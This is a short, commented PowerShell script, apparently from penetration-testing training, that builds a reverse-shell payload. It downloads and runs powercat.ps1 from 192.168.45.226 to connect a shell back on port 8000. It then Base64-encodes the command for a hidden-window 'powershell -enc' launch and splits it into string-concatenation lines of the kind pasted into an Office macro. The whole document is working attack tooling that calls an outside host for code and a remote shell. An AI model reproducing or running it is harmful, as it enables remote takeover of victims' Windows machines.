# The $command variable holds the PowerShell command to be executed. It downloads and executes the powercat.ps1 script
# from a web server, then runs powercat with specific options. You can replace the URL 'http://192.168.45.226/powercat.ps1'
# and the IP address '192.168.45.226' with the URL of your script and the IP address of your server, respectively.
$command = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.226/powercat.ps1');powercat -c 192.168.45.226 -p 8000 -e powershell"

# The command is then converted into Base64, a common encoding scheme that converts binary data into ASCII string format.
# It helps avoid issues with special characters and makes the command easier to work with.
$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))

# This is the prefix for each chunk of the command that will be executed. The 'powershell.exe -nop -w hidden -enc' part
# tells PowerShell to run with no profile, window hidden and the following command will be encoded in Base64.
$prefix = 'Str = Str + "powershell.exe -nop -w hidden -enc "'

# The -split operator breaks the base64 command into chunks of 50 characters each. Each chunk is then added to the $prefix
# variable with the string 'Str = Str + "' appended to the start and the string '"' appended to the end. You can replace 50
# with any other number if you want to change the chunk size.
$encodedCommand -split '(.{50})' | ForEach-Object {
    if ($_){
        $prefix += "`nStr = Str & `"$($_)`""
    }
}

# The modified command is then printed to the console. You can use this string as a command in a PowerShell script to
# download and execute the powercat.ps1 script from a web server.
Write-Host $prefix
